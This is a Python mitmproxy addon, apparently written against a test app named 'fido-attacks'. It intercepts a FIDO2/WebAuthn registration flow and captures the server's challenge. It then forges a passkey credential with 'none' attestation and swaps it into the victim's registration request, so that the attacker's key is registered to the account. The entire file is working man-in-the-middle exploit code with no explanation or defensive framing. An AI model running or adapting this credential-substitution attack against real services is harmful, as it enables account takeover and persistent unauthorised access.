import base64
import hashlib
import json
import os
import struct
import cbor2
from mitmproxy import http
from cryptography.hazmat.primitives.asymmetric.ec import generate_private_key, SECP256R1
from cryptography.hazmat.backends import default_backend

LOG_FILE = "mitm_log.txt"
RP_ID = "fido-attacks-cw8ov.ondigitalocean.app"
ORIGIN = "https://fido-attacks-cw8ov.ondigitalocean.app"

captured_challenge = None

def log(message: str):
    with open(LOG_FILE, "a") as f:
        f.write(message + "\n")

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def make_attacker_credential(challenge: str) -> dict:
    private_key = generate_private_key(SECP256R1(), default_backend())
    public_key = private_key.public_key()
    pub_numbers = public_key.public_numbers()

    # COSE-encoded EC P-256 public key
    cose_key = cbor2.dumps({
        1:  2,   # kty: EC2
        3:  -7,  # alg: ES256
        -1: 1,   # crv: P-256
        -2: pub_numbers.x.to_bytes(32, "big"),
        -3: pub_numbers.y.to_bytes(32, "big"),
    })

    cred_id = os.urandom(32)

    # authData: rpIdHash || flags || signCount || aaguid || credIdLen || credId || coseKey
    rp_id_hash  = hashlib.sha256(RP_ID.encode()).digest()
    flags       = b"\x41"  # UP (bit 0) + AT (bit 6)
    sign_count  = struct.pack(">I", 0)
    aaguid      = b"\x00" * 16
    cred_id_len = struct.pack(">H", len(cred_id))
    auth_data   = rp_id_hash + flags + sign_count + aaguid + cred_id_len + cred_id + cose_key

    client_data = json.dumps({
        "type":      "webauthn.create",
        "challenge": challenge,
        "origin":    ORIGIN,
    }, separators=(",", ":")).encode()

    attestation_object = cbor2.dumps({
        "fmt":      "none",
        "attStmt":  {},
        "authData": auth_data,
    })

    return {
        "cred_id":            b64url(cred_id),
        "client_data":        client_data.decode(),
        "cose_key_x":         b64url(pub_numbers.x.to_bytes(32, "big")),
        "cose_key_y":         b64url(pub_numbers.y.to_bytes(32, "big")),
        "credential": {
            "id":    b64url(cred_id),
            "rawId": b64url(cred_id),
            "response": {
                "clientDataJSON":    b64url(client_data),
                "attestationObject": b64url(attestation_object),
            },
            "type": "public-key",
        },
    }

class FIDO2MITM:
    def response(self, flow: http.HTTPFlow):
        global captured_challenge
        if "/signup-register-options" in flow.request.path:
            log("Intercepted /signup-register-options")
            data = json.loads(flow.response.text)
            log(f"Response Data: {data}")
            captured_challenge = data.get("challenge")
            log(f"Captured Challenge: {captured_challenge}")

    def request(self, flow: http.HTTPFlow):
        if "/signup-register-verify" in flow.request.path and captured_challenge:
            log("Intercepted /signup-register-verify")
            log(f"Original Request: {flow.request.text}")

            result = make_attacker_credential(captured_challenge)

            log(f"Credential ID:       {result['cred_id']}")
            log(f"clientDataJSON:      {result['client_data']}")
            log(f"Public Key X:        {result['cose_key_x']}")
            log(f"Public Key Y:        {result['cose_key_y']}")

            body = json.dumps(result["credential"]).encode()
            flow.request.content = body
            flow.request.headers["content-length"] = str(len(body))

addons = [FIDO2MITM()]
